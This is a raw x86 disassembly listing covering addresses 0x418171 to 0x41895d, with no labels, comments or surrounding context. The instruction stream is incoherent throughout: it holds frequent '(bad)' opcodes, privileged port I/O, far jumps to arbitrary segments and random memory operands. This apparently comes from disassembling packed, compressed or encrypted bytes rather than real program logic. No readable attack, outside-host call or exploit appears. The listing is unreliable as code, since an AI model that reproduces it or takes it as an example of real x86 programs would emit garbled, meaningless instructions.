  418171:	mov    eax,ds:0xdc2f00a5
  418176:	call   0xba13984
  41817b:	xchg   edx,eax
  41817c:	cmp    cl,BYTE PTR [ebx]
  41817e:	sti    
  41817f:	call   0xaec9921c
  418184:	push   ss
  418185:	or     cl,ah
  418187:	repz repnz sub al,0x65
  41818b:	xor    bl,BYTE PTR [ecx-0x4ca96408]
  418191:	push   edi
  418192:	xchg   ebx,eax
  418193:	loopne 0x418154
  418195:	inc    ebp
  418196:	pushf  
  418197:	stos   DWORD PTR es:[edi],eax
  418198:	stos   DWORD PTR es:[edi],eax
  418199:	je     0x41814e
  41819b:	dec    ebp
  41819c:	xchg   ebp,eax
  41819d:	imul   ebx,DWORD PTR [ebx+0x25],0x3ed813b5
  4181a4:	push   0xfffffff1
  4181a6:	pop    eax
  4181a7:	sbb    bl,BYTE PTR [edi-0x453542e3]
  4181ad:	nop
  4181ae:	popf   
  4181af:	sbb    cl,dh
  4181b1:	dec    ebp
  4181b2:	mov    ebx,DWORD PTR [esi+esi*4+0x7267f109]
  4181b9:	setns  BYTE PTR [ecx]
  4181bc:	inc    DWORD PTR [edx+eiz*4+0x1b]
  4181c0:	cmp    DWORD PTR [ebp+0x5264bf4d],0x37
  4181c7:	mov    al,ds:0x3922ce9c
  4181cc:	ret    0x3724
  4181cf:	xor    eax,0x670f65e0
  4181d4:	jae    0x418234
  4181d6:	imul   edx,DWORD PTR [esi+0x20],0x61
  4181da:	fidivr DWORD PTR [eax]
  4181dc:	sbb    ah,cl
  4181de:	push   eax
  4181df:	cmc    
  4181e0:	ins    BYTE PTR es:[edi],dx
  4181e1:	mov    ds:0x8be80ada,al
  4181e6:	cmp    DWORD PTR fs:[ecx+0x50],edi
  4181ea:	(bad)  
  4181eb:	loopne 0x418214
  4181ed:	xor    DWORD PTR [ebx-0x2d81b366],esi
  4181f3:	lahf   
  4181f4:	inc    edx
  4181f5:	data16 out 0x2c,al
  4181f8:	mov    ds:0x65d56b2d,al
  4181fd:	pop    edi
  4181fe:	jle    0x41825c
  418200:	dec    eax
  418201:	loop   0x418277
  418203:	cmp    eax,0x378aabd3
  418208:	jb     0x4181a3
  41820a:	sub    esp,DWORD PTR [ebx+0x0]
  41820d:	dec    eax
  41820e:	sti    
  41820f:	or     eax,esp
  418211:	jno    0x418233
  418213:	xor    dl,bl
  418215:	pause  
  418217:	popf   
  418218:	push   edi
  418219:	imul   esp,DWORD PTR [ebx+0x41],0x7bed24f8
  418220:	cmp    BYTE PTR [eax+edi*8-0x45ed37e4],bl
  418227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418228:	(bad)  
  418229:	js     0x4181c2
  41822b:	jno    0x4181fe
  41822d:	sub    dl,ch
  41822f:	and    bl,dh
  418231:	pushf  
  418232:	mov    cl,0xe8
  418234:	rcr    BYTE PTR [ecx],0xb5
  418237:	arpl   WORD PTR [ecx+0x409b8c77],bx
  41823d:	fs sbb eax,0x6686c15c
  418243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418244:	push   ebp
  418245:	imul   ecx,DWORD PTR [esp+ebp*8],0xf27778c9
  41824c:	dec    eax
  41824d:	jmp    0x4cb1:0xf9535882
  418254:	loope  0x418263
  418256:	fsub   DWORD PTR [esi+0x7136976e]
  41825c:	and    ebx,ecx
  41825e:	out    dx,eax
  41825f:	(bad)  
  418260:	cld    
  418261:	ret    
  418262:	pop    ecx
  418263:	or     edx,eax
  418265:	ss mov eax,0xa0b485f3
  41826b:	icebp  
  41826c:	aad    0xed
  41826e:	outs   dx,BYTE PTR ds:[esi]
  41826f:	std    
  418270:	outs   dx,BYTE PTR ds:[esi]
  418271:	retf   0xfd32
  418274:	pop    ds
  418275:	into   
  418276:	sbb    DWORD PTR [ecx+ebx*8+0x2a],ebp
  41827a:	aas    
  41827b:	in     al,0x7e
  41827d:	sub    al,0x53
  41827f:	es mov ecx,0xfa84467b
  418285:	enter  0x450a,0x38
  418289:	mov    ds:0xc0568bab,al
  41828e:	add    bh,BYTE PTR [edx+0x56]
  418291:	test   dh,dl
  418293:	mov    esi,0x657e290d
  418298:	adc    BYTE PTR [eax-0x5a965e77],0x52
  41829f:	cmc    
  4182a0:	and    DWORD PTR [ebx+0x742b2023],edi
  4182a6:	mov    esp,0xd0037db0
  4182ab:	sar    BYTE PTR [ecx],cl
  4182ad:	in     eax,dx
  4182ae:	inc    ebp
  4182af:	fisttp DWORD PTR [ebx+0x21]
  4182b2:	mov    ecx,DWORD PTR [eax]
  4182b4:	(bad)  
  4182b5:	fdiv   QWORD PTR [edi-0x23]
  4182b8:	data16 mov ah,0x2
  4182bb:	xchg   ebx,eax
  4182bc:	cmp    DWORD PTR [esi+0x3aaae391],ebx
  4182c2:	cs sar esp,1
  4182c5:	cmp    eax,0x1b98571d
  4182ca:	xor    edi,DWORD PTR ds:0x2ec781eb
  4182d0:	loop   0x4182b3
  4182d2:	push   cs
  4182d3:	push   ss
  4182d4:	cmp    eax,0x5e6af983
  4182d9:	mov    WORD PTR ds:0x17a0dd0e,gs
  4182df:	fisub  WORD PTR [edx+0x56]
  4182e2:	(bad)  
  4182e3:	icebp  
  4182e4:	mov    edx,0xd8481ef9
  4182e9:	sbb    eax,0x772447f2
  4182ee:	retf   
  4182ef:	ret    
  4182f0:	mov    edi,0x87dfad6
  4182f5:	(bad)  
  4182f6:	(bad)
  4182f9:	and    esi,edi
  4182fb:	es loopne 0x41830c
  4182fe:	xor    BYTE PTR [esi+0x1c],al
  418301:	mov    eax,0xdcfe8943
  418306:	sar    BYTE PTR [edx-0x6dcec89c],cl
  41830c:	mov    ?,WORD PTR [ebx+0x1410602d]
  418312:	jecxz  0x418310
  418314:	xchg   ecx,eax
  418315:	fwait
  418316:	inc    eax
  418317:	in     al,0x39
  418319:	dec    esp
  41831a:	les    ecx,FWORD PTR [edx+edi*2-0x4a]
  41831e:	xchg   DWORD PTR [edi+0x25],eax
  418321:	inc    esp
  418322:	sahf   
  418323:	inc    esi
  418324:	cmp    BYTE PTR [esp+edi*4-0x46],dh
  418328:	xchg   edi,eax
  418329:	fcmovb st,st(7)
  41832b:	fbld   TBYTE PTR ss:[edi]
  41832e:	dec    BYTE PTR [eax+0x11]
  418331:	cwde   
  418332:	pop    es
  418333:	mov    ch,0xb6
  418335:	iret   
  418336:	mov    ah,0x80
  418338:	lea    ecx,[edx-0x6]
  41833b:	xor    BYTE PTR ds:0x2935a694,al
  418341:	sar    ah,cl
  418343:	xor    bl,BYTE PTR [ecx]
  418345:	sbb    esi,DWORD PTR [edx+eax*4+0x215d907f]
  41834c:	cmp    edx,ebp
  41834e:	les    ebx,FWORD PTR [eax]
  418350:	aas    
  418351:	inc    eax
  418352:	outs   dx,BYTE PTR ds:[esi]
  418353:	or     al,0xca
  418355:	add    bh,dl
  418357:	lods   eax,DWORD PTR ds:[esi]
  418358:	dec    edi
  418359:	out    0xa9,eax
  41835b:	rcr    DWORD PTR [edi],cl
  41835d:	push   edx
  41835e:	pop    eax
  41835f:	lahf   
  418360:	dec    ebp
  418361:	aam    0xc3
  418363:	xor    ebx,DWORD PTR [ecx]
  418365:	in     al,dx
  418366:	push   eax
  418367:	outs   dx,DWORD PTR ds:[esi]
  418368:	push   esp
  418369:	mov    ?,WORD PTR [esi+0x2726f4ea]
  41836f:	fiadd  WORD PTR [eax+0x4e]
  418372:	push   cs
  418373:	push   eax
  418374:	sub    cl,BYTE PTR [eax+0x3fb0a6b0]
  41837a:	cli    
  41837b:	mov    esp,0xdc9e8530
  418380:	and    ebx,edi
  418382:	jmp    FWORD PTR cs:[eax+0x6f]
  418386:	aas    
  418387:	repz pop edx
  418389:	fcomp  QWORD PTR [edx]
  41838b:	inc    DWORD PTR [edi-0x6f796819]
  418391:	out    0xc2,al
  418393:	test   eax,0x6de102d0
  418398:	leave  
  418399:	jl     0x41835a
  41839b:	mov    eax,ds:0x6db7a47d
  4183a0:	ret    
  4183a1:	ins    BYTE PTR es:[edi],dx
  4183a2:	mov    bl,0xdc
  4183a4:	mov    esi,0x17388692
  4183a9:	add    eax,0x7974dd4b
  4183ae:	iret   
  4183af:	and    DWORD PTR [esi-0x8e567e0],edi
  4183b5:	mov    cl,bh
  4183b7:	mov    al,0x36
  4183b9:	mov    dh,cl
  4183bb:	push   cs
  4183bc:	lock inc edi
  4183be:	call   0x1c416c99
  4183c3:	cmp    al,BYTE PTR [ebx-0x1678426b]
  4183c9:	das    
  4183ca:	xor    al,0xf4
  4183cc:	mov    esi,DWORD PTR [esi+ebp*4-0x324665e8]
  4183d3:	add    DWORD PTR [ecx+edi*2-0x72322d5],esp
  4183da:	retf   0x434b
  4183dd:	pop    es
  4183de:	jno    0x4183db
  4183e0:	fadd   QWORD PTR [ecx]
  4183e2:	dec    ecx
  4183e3:	int3   
  4183e4:	mov    dh,0x43
  4183e6:	cmp    DWORD PTR [ecx+0x73b54a29],edi
  4183ec:	mov    BYTE PTR [edx+0x1],cl
  4183ef:	lds    esi,FWORD PTR [ebx+0x4077c4d8]
  4183f5:	mov    bl,0xc2
  4183f7:	pop    ss
  4183f8:	out    dx,al
  4183f9:	push   0xfffffff5
  4183fb:	shl    DWORD PTR [esi],cl
  4183fd:	jg     0x4183e1
  4183ff:	xchg   ecx,eax
  418400:	sbb    DWORD PTR [edi-0x389360b],eax
  418406:	leave  
  418407:	dec    edx
  418408:	cwde   
  418409:	adc    BYTE PTR [ecx*4-0xd3fa216],ah
  418410:	adc    al,0x55
  418412:	xchg   ebp,eax
  418413:	dec    ebx
  418414:	lods   al,BYTE PTR ds:[esi]
  418415:	sbb    BYTE PTR [edx+edx*8+0x28a01e07],0x5d
  41841d:	mov    eax,edx
  41841f:	push   ss
  418420:	jmp    0x910aea08
  418425:	repz shr cl,1
  418428:	loope  0x4183ad
  41842a:	pop    es
  41842b:	mov    WORD PTR [bp-0x62],fs
  41842f:	push   eax
  418430:	and    BYTE PTR ss:[esi],0x2a
  418434:	lock test al,0x0
  418437:	sahf   
  418438:	or     edi,DWORD PTR [edi]
  41843a:	popa   
  41843b:	adc    BYTE PTR [esi-0x7d],dh
  41843e:	call   DWORD PTR [ebx-0x10f08add]
  418444:	enter  0xfd1c,0xc2
  418448:	aas    
  418449:	sub    DWORD PTR [edx],esp
  41844b:	popa   
  41844c:	jae    0x418470
  41844e:	les    esp,FWORD PTR [ebx-0x57cae794]
  418454:	dec    edx
  418455:	sub    al,0x6e
  418457:	out    0x71,al
  418459:	in     al,dx
  41845a:	pop    eax
  41845b:	ret    0xda0c
  41845e:	push   eax
  41845f:	xchg   ebx,eax
  418460:	sub    DWORD PTR [edx+0x7d],ebx
  418463:	push   0xfffffff8
  418465:	das    
  418466:	lods   al,BYTE PTR ds:[esi]
  418467:	cmp    esp,DWORD PTR [ebp+0x55]
  41846a:	pop    eax
  41846b:	and    eax,0xe5487fa1
  418470:	sti    
  418471:	fsubrp st(0),st
  418473:	addr16 dec edi
  418475:	or     esi,0xa93f918d
  41847b:	cmp    ebx,DWORD PTR ds:0xeb2e4022
  418481:	(bad)
  418486:	dec    ebx
  418487:	int3   
  418488:	and    DWORD PTR [edi+0x6c177066],0xd46affab
  418492:	div    BYTE PTR [ebx+0xffc48b]
  418498:	sub    esp,DWORD PTR [ebp+eiz*2-0x709ace39]
  41849f:	sbb    al,0x6e
  4184a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a3:	inc    edi
  4184a4:	mov    eax,ds:0xdd570583
  4184a9:	and    ebx,ecx
  4184ab:	loop   0x418431
  4184ad:	pop    esi
  4184ae:	xchg   DWORD PTR [edi+0x154385d7],esi
  4184b4:	jb     0x418525
  4184b6:	ins    DWORD PTR es:[edi],dx
  4184b7:	jo     0x418503
  4184b9:	jns    0x4184c9
  4184bb:	test   eax,0x107a56f9
  4184c0:	sti    
  4184c1:	mov    dl,0xb8
  4184c3:	jbe    0x418529
  4184c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c6:	add    al,0x22
  4184c8:	arpl   WORD PTR [ebx-0x62],si
  4184cb:	xchg   ebx,eax
  4184cc:	dec    ecx
  4184cd:	mov    edx,0x2ebcd14
  4184d2:	test   DWORD PTR [ecx],ebx
  4184d4:	hlt    
  4184d5:	(bad)  
  4184d6:	mov    al,0xce
  4184d8:	lds    esp,FWORD PTR [ecx]
  4184da:	and    DWORD PTR [edi+0x2e1023de],edx
  4184e0:	nop
  4184e1:	mov    ds:0x32004d7d,al
  4184e6:	shl    BYTE PTR [ebx],cl
  4184e8:	dec    ecx
  4184e9:	xor    eax,0xb289cd18
  4184ee:	popa   
  4184ef:	push   es
  4184f0:	clc    
  4184f1:	imul   eax,DWORD PTR [ecx],0xffffffce
  4184f4:	xchg   BYTE PTR [ecx],al
  4184f6:	pop    edi
  4184f7:	rol    BYTE PTR [ecx-0x1e],cl
  4184fa:	and    ebx,edi
  4184fc:	fs inc ebp
  4184fe:	fidiv  WORD PTR [ebp-0x1]
  418501:	aam    0x98
  418503:	and    cl,BYTE PTR [esi]
  418505:	shl    DWORD PTR [edi-0x1be533f3],0x3d
  41850c:	pop    esp
  41850d:	xor    eax,0xdea9ba2d
  418512:	and    DWORD PTR [edi+0x62],ebp
  418515:	test   al,0xe0
  418517:	(bad)  
  418518:	ror    DWORD PTR [edi-0x53],cl
  41851b:	adc    ah,al
  41851d:	repz dec eax
  41851f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418520:	pop    esp
  418521:	sahf   
  418522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418523:	mov    al,ds:0x64beb54c
  418528:	stc    
  418529:	jg     0x4185a9
  41852b:	adc    ebp,esp
  41852d:	popf   
  41852e:	adc    al,0x73
  418530:	fabs   
  418532:	or     DWORD PTR [ebx+0x7ce0a3ca],eax
  418538:	add    ah,al
  41853a:	pop    ebp
  41853b:	dec    esi
  41853c:	ret    
  41853d:	in     al,dx
  41853e:	pop    es
  41853f:	imul   DWORD PTR [esi]
  418541:	adc    ch,bh
  418543:	sbb    edi,DWORD PTR [esi-0x309764eb]
  418549:	scas   al,BYTE PTR es:[edi]
  41854a:	dec    ecx
  41854b:	jb     0x4185ae
  41854d:	jecxz  0x418562
  41854f:	adc    eax,0x1f296d6f
  418554:	fwait
  418555:	enter  0x1ca0,0xd7
  418559:	mov    esi,0x517ac488
  41855e:	das    
  41855f:	daa    
  418560:	lds    edi,FWORD PTR [edi-0x5c]
  418563:	dec    ebx
  418564:	jb     0x4185a5
  418566:	mov    ebp,DWORD PTR [ecx+0x5caba8bc]
  41856c:	push   esp
  41856d:	leave  
  41856e:	lds    eax,FWORD PTR [ecx]
  418570:	jmp    0x4184f7
  418572:	scas   eax,DWORD PTR es:[edi]
  418573:	leave  
  418574:	out    0x16,al
  418576:	sbb    ah,BYTE PTR [edi-0x40]
  418579:	repz push edx
  41857b:	sub    al,0xc6
  41857d:	push   eax
  41857e:	lods   al,BYTE PTR ds:[esi]
  41857f:	push   ebp
  418580:	cmovg  edx,DWORD PTR [ebx-0x4e296423]
  418587:	jno    0x41853c
  418589:	popa   
  41858a:	mov    ecx,0x21c6dbd6
  41858f:	pushf  
  418590:	jnp    0x41852f
  418592:	(bad)  
  418593:	int    0xee
  418595:	jp     0x4185f3
  418597:	out    dx,al
  418598:	xor    BYTE PTR ds:0x387e3c6d,cl
  41859e:	rol    DWORD PTR [edi+0x410461c9],cl
  4185a4:	setle  ah
  4185a7:	ret    0x9fdd
  4185aa:	add    al,0xcd
  4185ac:	xor    al,0x25
  4185ae:	mov    ds:0x993d49c9,al
  4185b3:	sbb    ebp,ebx
  4185b5:	sub    cl,dh
  4185b7:	scas   al,BYTE PTR es:[edi]
  4185b8:	ja     0x41857c
  4185ba:	xchg   ecx,esi
  4185bc:	jno    0x4185af
  4185be:	popf   
  4185bf:	lea    esp,[edi+0x60]
  4185c2:	js     0x4185a1
  4185c4:	pop    esi
  4185c5:	add    eax,0xf2dd4347
  4185ca:	div    dl
  4185cc:	gs dec edi
  4185ce:	(bad)  
  4185cf:	xchg   edi,eax
  4185d0:	out    0x2d,al
  4185d2:	inc    edx
  4185d3:	outs   dx,BYTE PTR ds:[esi]
  4185d4:	icebp  
  4185d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d6:	retf   0xf506
  4185d9:	or     eax,0xccc185f4
  4185de:	or     dl,BYTE PTR [esi+0x5e]
  4185e1:	inc    edi
  4185e2:	and    eax,esi
  4185e4:	dec    ecx
  4185e5:	mov    ebx,0x5ad81c10
  4185ea:	add    BYTE PTR [edx+0x317f83ad],0x46
  4185f1:	imul   ecx,ecx,0xeaf9958d
  4185f7:	nop
  4185f8:	fist   DWORD PTR [eax]
  4185fa:	outs   dx,BYTE PTR ds:[esi]
  4185fb:	mov    esi,ebx
  4185fd:	in     eax,dx
  4185fe:	fstp   DWORD PTR [edi]
  418600:	nop
  418601:	bswap  ebp
  418603:	dec    edx
  418604:	lods   al,BYTE PTR ds:[esi]
  418605:	call   0x6be9:0x47c1c885
  41860c:	push   esp
  41860d:	mov    al,0x15
  41860f:	dec    ebp
  418610:	jg     0x41867b
  418612:	scas   al,BYTE PTR es:[edi]
  418613:	fwait
  418614:	inc    edi
  418615:	imul   ebx,edi,0xfc18745a
  41861b:	pop    edx
  41861c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41861d:	es jns 0x41860b
  418620:	inc    eax
  418621:	es (bad) 
  418623:	pop    esi
  418624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418625:	test   BYTE PTR [esp+edi*1],al
  418628:	pop    ss
  418629:	jge    0x4185c1
  41862b:	icebp  
  41862c:	test   al,0x97
  41862e:	fstp   QWORD PTR [eax+0x39187666]
  418634:	in     eax,0x4f
  418636:	or     al,0xb4
  418638:	dec    edi
  418639:	pop    ebp
  41863a:	imul   ebx,edi,0xd19cab92
  418640:	mov    al,0xbe
  418642:	aam    0x42
  418644:	adc    al,0x2c
  418646:	aas    
  418647:	xchg   esp,eax
  418648:	fldcw  WORD PTR [edx-0x8]
  41864b:	repz adc al,0xf9
  41864e:	arpl   WORD PTR [ebx+eax*4],bp
  418651:	jnp    0x41867b
  418653:	rol    DWORD PTR [ebp-0x7590dc1b],0xe6
  41865a:	pop    edi
  41865b:	dec    edi
  41865c:	retf   0x63e
  41865f:	xchg   ebx,eax
  418660:	(bad)  
  418661:	rol    ah,1
  418663:	scas   al,BYTE PTR es:[edi]
  418664:	jne    0x418671
  418666:	sub    edx,DWORD PTR [esi-0x70afbf]
  41866c:	dec    edx
  41866d:	sti    
  41866e:	adc    BYTE PTR [edx],al
  418670:	pusha  
  418671:	sub    esp,DWORD PTR [ebp-0x3d64c010]
  418677:	aas    
  418678:	and    al,0x4f
  41867a:	stc    
  41867b:	pop    edi
  41867c:	sti    
  41867d:	and    eax,0xa509de90
  418682:	dec    ecx
  418683:	out    0xee,al
  418685:	iret   
  418686:	imul   edi,DWORD PTR [esi-0x47c45df7],0x44d13de9
  418690:	push   ss
  418691:	mov    bl,BYTE PTR [eax-0x58]
  418694:	xchg   ebx,eax
  418695:	and    al,0xa8
  418697:	call   0xcc2f84f4
  41869c:	cld    
  41869d:	push   esp
  41869e:	bound  edx,QWORD PTR [edi+0x2b]
  4186a1:	mov    bh,0x2
  4186a3:	inc    BYTE PTR ds:0xc08bd063
  4186a9:	sbb    dl,BYTE PTR [eax-0x4f2462a4]
  4186af:	jbe    0x41868b
  4186b1:	cmp    ch,BYTE PTR [ebx+0x28eebafc]
  4186b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186b8:	(bad)  
  4186b9:	aas    
  4186ba:	pop    DWORD PTR fs:[ebp+edi*8+0x27111a3d]
  4186c2:	mov    esp,0xe1f7c22
  4186c7:	sub    esp,DWORD PTR [eax+0x38]
  4186ca:	sub    eax,0x51db6ebc
  4186cf:	xchg   DWORD PTR [ebp+0x355521c2],esp
  4186d5:	shr    esi,0xb9
  4186d8:	add    esp,ecx
  4186da:	mov    esi,0x3a5cf78
  4186df:	pop    ebx
  4186e0:	scas   al,BYTE PTR es:[edi]
  4186e1:	push   edx
  4186e2:	mov    edi,0x9bc3769f
  4186e7:	push   edx
  4186e8:	mov    edi,0xac30129f
  4186ed:	or     ebp,0xffffffa1
  4186f0:	std    
  4186f1:	jno    0x418684
  4186f3:	stos   DWORD PTR es:[edi],eax
  4186f4:	jnp    0x418690
  4186f6:	dec    ecx
  4186f7:	out    dx,al
  4186f8:	dec    esp
  4186f9:	lahf   
  4186fa:	pop    ds
  4186fb:	pushf  
  4186fc:	push   esi
  4186fd:	jmp    0xe3a81b68
  418702:	cmc    
  418703:	std    
  418704:	fwait
  418705:	mov    dl,0x75
  418707:	int3   
  418708:	(bad)  
  418709:	fimul  WORD PTR [ebx+0x51]
  41870c:	pusha  
  41870d:	cmp    eax,0x1faf5518
  418712:	push   edx
  418713:	mov    bh,0xab
  418715:	xor    dl,dl
  418717:	lods   eax,DWORD PTR ds:[esi]
  418718:	out    dx,eax
  418719:	sbb    DWORD PTR ds:0x7bfa49ce,ebx
  41871f:	mov    es,WORD PTR [ebx+edi*1]
  418722:	or     eax,0x188e3842
  418727:	push   esp
  418728:	adc    DWORD PTR [esi],0x19ed5a0f
  41872e:	push   es
  41872f:	adc    edx,DWORD PTR [ecx+0x77]
  418732:	sub    BYTE PTR [esi],al
  418734:	and    edi,esp
  418736:	pushf  
  418737:	xor    BYTE PTR [ecx-0x2bda3d76],0x48
  41873e:	mov    al,0x96
  418740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	outs   dx,DWORD PTR ds:[esi]
  418743:	add    ah,BYTE PTR [eax-0x22f55f76]
  418749:	repnz aam 0x7a
  41874c:	pop    es
  41874d:	gs lahf 
  41874f:	jl     0x418763
  418751:	aaa    
  418752:	cmp    bh,ch
  418754:	xchg   esi,eax
  418755:	add    bh,al
  418757:	cwde   
  418758:	inc    ebx
  418759:	dec    ebx
  41875a:	xor    DWORD PTR [esi-0x6381ce85],esi
  418760:	(bad)
  418765:	push   edx
  418766:	push   ebx
  418767:	imul   ecx,DWORD PTR [esi-0x7e8c5d82],0xf
  41876e:	sub    DWORD PTR [ebp-0x6df7e2b0],0xb5d4e0b2
  418778:	add    eax,0x222b639
  41877d:	stc    
  41877e:	leave  
  41877f:	es push ebp
  418781:	xchg   BYTE PTR [ebp+0x21],al
  418784:	in     eax,0xb8
  418786:	leave  
  418787:	mov    bh,al
  418789:	jae    0x418747
  41878b:	dec    DWORD PTR [ebp-0x4162e06b]
  418791:	sbb    BYTE PTR [esi+esi*2],0x8e
  418795:	rcr    DWORD PTR [edx+0x163d1a0e],0x95
  41879c:	pusha  
  41879d:	stos   BYTE PTR es:[edi],al
  41879e:	retf   
  41879f:	mov    esp,0x902b202d
  4187a4:	xchg   ebx,eax
  4187a5:	enter  0xb45c,0xc
  4187a9:	dec    ebp
  4187aa:	(bad)  
  4187ab:	out    dx,al
  4187ac:	mov    al,ds:0xfd7a2ca9
  4187b1:	inc    ebp
  4187b2:	aaa    
  4187b3:	push   ss
  4187b4:	in     al,dx
  4187b5:	mov    esp,0xcfb509eb
  4187ba:	les    edx,FWORD PTR [ebx+0x7e]
  4187bd:	mov    ch,0x16
  4187bf:	shl    BYTE PTR [eax-0x49c2a3e6],cl
  4187c5:	loop   0x418819
  4187c7:	xchg   edx,eax
  4187c8:	ret    
  4187c9:	not    BYTE PTR [ebx]
  4187cb:	(bad)  
  4187cc:	aad    0x5
  4187ce:	fadd   st(5),st
  4187d0:	jne    0x4187e9
  4187d2:	enter  0x359c,0x30
  4187d6:	jns    0x418839
  4187d8:	dec    esi
  4187d9:	jae    0x418777
  4187db:	scas   al,BYTE PTR es:[edi]
  4187dc:	leave  
  4187dd:	mov    dl,0x3
  4187df:	and    al,0x37
  4187e1:	into   
  4187e2:	adc    eax,esi
  4187e4:	dec    eax
  4187e5:	enter  0x484e,0xac
  4187e9:	in     eax,0x6b
  4187eb:	iret   
  4187ec:	(bad)  
  4187ed:	adc    cl,ch
  4187ef:	ins    DWORD PTR es:[edi],dx
  4187f0:	and    BYTE PTR [ecx],bl
  4187f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187f3:	aam    0xd9
  4187f5:	xchg   esp,eax
  4187f6:	push   esi
  4187f7:	xor    al,0x3
  4187f9:	ret    0x78eb
  4187fc:	retf   0x90e5
  4187ff:	repz push edx
  418801:	ja     0x41883c
  418803:	push   es
  418804:	rcr    eax,0xa2
  418807:	jl     0x4187b4
  418809:	call   0xb17ea744
  41880e:	cwde   
  41880f:	mov    al,ds:0x7e221e7d
  418814:	push   cs
  418815:	inc    eax
  418816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418817:	xor    esp,DWORD PTR ds:0x77db4b4d
  41881d:	or     edi,ebp
  41881f:	(bad)
  418822:	sbb    DWORD PTR [ebx],esi
  418824:	(bad)  
  418825:	ins    BYTE PTR es:[edi],dx
  418826:	pop    edx
  418827:	xor    al,0xd3
  418829:	sti    
  41882a:	jno    0x418839
  41882c:	dec    ebp
  41882d:	mov    ah,0x36
  41882f:	repnz (bad) 
  418831:	bound  eax,QWORD PTR [esi+0x77]
  418834:	or     DWORD PTR [esi],esi
  418836:	dec    eax
  418837:	inc    edx
  418838:	into   
  418839:	push   ebp
  41883a:	sbb    ah,ah
  41883c:	repnz cdq 
  41883e:	jae    0x418804
  418840:	pop    ebx
  418841:	stos   DWORD PTR es:[edi],eax
  418842:	arpl   WORD PTR [eax+0x7c],ax
  418845:	sub    al,0xc
  418847:	or     ecx,DWORD PTR [ebp+0x47]
  41884a:	leave  
  41884b:	test   ax,0xce68
  41884f:	jo     0x41880c
  418851:	jnp    0x418882
  418853:	test   ecx,ebp
  418855:	jns    0x4188c9
  418857:	or     al,0x33
  418859:	shl    DWORD PTR [eax-0x13],0x1b
  41885d:	out    0xa2,eax
  41885f:	lods   al,BYTE PTR ds:[esi]
  418860:	dec    edx
  418861:	in     eax,0x55
  418863:	iret   
  418864:	xchg   edx,eax
  418865:	sbb    edi,DWORD PTR [ebx-0x54c0ffec]
  41886b:	rcr    BYTE PTR [ebp+eax*1+0x6287a6c2],1
  418872:	(bad)  [esi-0x2a]
  418875:	dec    esp
  418876:	mov    esp,0xe3746ed1
  41887b:	dec    esp
  41887c:	add    DWORD PTR [ebp+0xe],eax
  41887f:	pop    gs
  418881:	(bad)  
  418882:	and    BYTE PTR [edx+ebx*4-0x1],dl
  418886:	xor    eax,0x2fa93bae
  41888b:	adc    DWORD PTR [esi],edx
  41888d:	out    dx,al
  41888e:	sub    DWORD PTR [eax-0x78452e3e],0x55
  418895:	ja     0x4188b3
  418897:	mov    cl,0xc9
  418899:	nop
  41889a:	push   esp
  41889b:	loopne 0x41884d
  41889d:	retf   0xa339
  4188a0:	sbb    al,0xfb
  4188a2:	stos   DWORD PTR es:[edi],eax
  4188a3:	outs   dx,BYTE PTR ds:[esi]
  4188a4:	cwde   
  4188a5:	call   0x5d03:0xe33065cf
  4188ac:	inc    eax
  4188ad:	adc    al,0x54
  4188af:	mov    ch,0xb0
  4188b1:	sbb    eax,0x5faec2a3
  4188b6:	jns    0x418927
  4188b8:	xor    eax,0x7133f877
  4188bd:	add    eax,0xb61e2ff3
  4188c2:	sar    DWORD PTR [edx+0x39a834ac],1
  4188c8:	mov    ebp,0x425d1a1
  4188cd:	dec    edi
  4188ce:	dec    esi
  4188cf:	(bad)  [esi-0x51e74c71]
  4188d5:	mov    ebp,edx
  4188d7:	fisttp DWORD PTR [esi]
  4188d9:	sub    edx,DWORD PTR [edi]
  4188db:	into   
  4188dc:	stos   DWORD PTR es:[edi],eax
  4188dd:	push   edx
  4188de:	push   ebp
  4188df:	inc    esp
  4188e0:	popf   
  4188e1:	ja     0x41891d
  4188e3:	add    ebp,esi
  4188e5:	dec    eax
  4188e6:	mov    ecx,0x5bd86274
  4188eb:	js     0x418878
  4188ed:	pop    esp
  4188ee:	sub    al,0x46
  4188f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f1:	neg    DWORD PTR [edx-0x1]
  4188f4:	jg     0x4188a2
  4188f6:	mov    ch,0x7d
  4188f8:	leave  
  4188f9:	pop    ss
  4188fa:	fwait
  4188fb:	or     al,0xdb
  4188fd:	jmp    0x41894f
  4188ff:	fist   WORD PTR [eax+esi*8]
  418902:	pusha  
  418903:	jp     0x418979
  418905:	push   0xffffffe8
  418907:	add    BYTE PTR [esi+ebp*8],0x81
  41890b:	jo     0x41892c
  41890d:	or     bh,ch
  41890f:	mov    eax,0xdfab665e
  418914:	inc    esp
  418915:	arpl   WORD PTR [esi],di
  418917:	stos   DWORD PTR es:[edi],eax
  418918:	xor    DWORD PTR [ecx+ebx*1-0x4af8e92e],0x77
  418920:	fidiv  DWORD PTR [eax-0x80]
  418923:	cli    
  418924:	jmp    0x4188ac
  418926:	ins    BYTE PTR es:[edi],dx
  418927:	cli    
  418928:	loop   0x4188ba
  41892a:	or     cl,0xd7
  41892d:	mov    edi,0x3b214be8
  418932:	xadd   BYTE PTR [esi-0x56],bl
  418936:	mov    ebp,ds
  418938:	pop    es
  418939:	scas   al,BYTE PTR es:[edi]
  41893a:	push   edx
  41893b:	bts    DWORD PTR [ebx-0x11a77a7],edi
  418942:	jmp    FWORD PTR [ebp*1-0x70809d5e]
  418949:	leave  
  41894a:	fbstp  TBYTE PTR [ecx-0x6f701144]
  418950:	fisubr DWORD PTR [ebx+0x7defc1de]
  418956:	xchg   DWORD PTR [ebp-0x3a1b99b5],esi
  41895c:	dec    edi
  41895d:	mov    ah,0x2a
